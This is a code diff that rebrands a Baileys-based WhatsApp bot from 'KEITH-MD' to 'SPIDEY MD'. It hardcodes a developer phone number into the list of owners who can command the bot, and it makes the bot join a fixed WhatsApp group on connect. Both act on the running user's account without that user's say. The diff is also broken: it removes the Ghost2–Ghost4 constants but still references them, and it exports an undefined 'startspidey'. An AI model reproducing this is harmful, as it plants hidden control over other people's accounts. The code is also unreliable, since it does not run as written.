@@ -1,5 +1,5 @@
 const {
-  default: KeithConnect, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent,
+  default: spideyConnect, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent,
   generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, useMultiFileAuthState,
   DisconnectReason, makeInMemoryStore, downloadContentFromMessage, jidDecode
 } = require("@whiskeysockets/baileys");
@@ -53,7 +53,7 @@ async function startKeith() {
     logger: pino({ level: "silent" }),
     printQRInTerminal: true,
     version: [2, 3000, 1015901307],
-    browser: ["KEITH-MD", "Safari", "3.0"],
+    browser: ["𝐒𝐏𝐈𝐃𝐄𝐘 𝐌𝐃", "Safari", "3.0"],
     fireInitQueries: false,
     shouldSyncHistoryMessage: true,
     downloadHistory: true,
@@ -147,10 +147,7 @@ async function startKeith() {
       const pushname = m.pushName || "No Name";
       const botNumber = await client.decodeJid(client.user.id);
       const servBot = botNumber.split('@')[0];
-      const Ghost = "254796299159"; 
-      const Ghost2 = "254110190196";
-      const Ghost3 = "2547483876159";
-      const Ghost4 = "254743995989";
+      const Ghost = "254785429940";
       const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
       const isOwner = superUserNumbers.includes(m.sender); 
       const isBotMessage = m.sender === botNumber;  
@@ -339,7 +336,7 @@ async function startKeith() {
         startKeith();
       }
     } else if (connection === "open") {
-      await client.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
+      await client.groupAcceptInvite("EWjLvrXVLzp3Vxn859FXHD");
       console.log(`✅ Connection successful\nLoaded ${totalCommands} commands.\nBot is active.`);
 
       const getGreeting = () => {
@@ -402,7 +399,7 @@ app.listen(port, () => console.log(`Server listening on port http://localhost:${
 
 startKeith();
 
-module.exports = startKeith;
+module.exports = startspidey;
 
 let file = require.resolve(__filename);
 fs.watchFile(file, () => {
